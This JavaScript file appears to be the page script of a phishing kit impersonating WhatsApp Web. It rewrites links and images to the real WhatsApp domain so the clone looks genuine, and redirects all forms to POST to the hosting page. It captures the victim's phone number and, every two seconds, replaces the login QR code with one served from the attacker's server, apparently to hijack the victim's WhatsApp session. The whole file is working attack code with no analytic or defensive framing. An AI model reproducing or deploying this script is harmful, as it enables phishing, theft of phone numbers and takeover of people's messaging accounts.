
document.querySelectorAll("link").forEach(li => {
    let prev = li.href
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.href = `https://web.whatsapp.com${prev}`
    }
})

document.querySelectorAll("img").forEach(li => {
    let prev = li.src
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.src = `https://web.whatsapp.com${prev}`
    }
})

for (let i = 1; i <= 4; i++) {
    const link = document.createElement("link")
    link.rel = "stylesheet"
    link.href = `/web/whatsapp${i}.css`
    document.head.appendChild(link)
}



let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

// sets
let phoneNumber = document.querySelectorAll(`[type="text"]`)
if (phoneNumber.length > 0) {
    phoneNumber[0].name = "phone_number"
    document.querySelectorAll(`.g0rxnol2.k2bacm8l`)[0].innerHTML = "<h3>Enter with country code.</h3>"
}

let form = document.createElement("form")
form.action = location.href
form.method = "POST"
let phone = document.querySelectorAll(`[role="button"]`)
if (phone.length > 0) {
    phone[1].addEventListener("click", () => {
        form.innerHTML = `<input type="hidden" name="spike-type" value="phone">`
        document.body.appendChild(form)
        document.forms[0].submit()
    })
}

let phoneNumSubmit = document.querySelectorAll(`[role="button"]`)
if (phoneNumSubmit.length > 0) {
    phoneNumSubmit[0].addEventListener("click", () => {
        addSpikeType("phone_number")
        document.forms[0].submit()
    })
}

// functions

let imageQR = document.querySelectorAll("._19vUU")
if (imageQR.length > 0) {
    const urlSplit = location.href.split("/")
    const id = urlSplit.pop()
    setInterval(() => {
        imageQR[0].innerHTML = `<img src="/web/${id}.png">`
    }, 2000)
}

// setTimeout(() => {
//     location.href = location.href
// }, 60000)


document.querySelector("img").src = "/web/whatsapp.png"
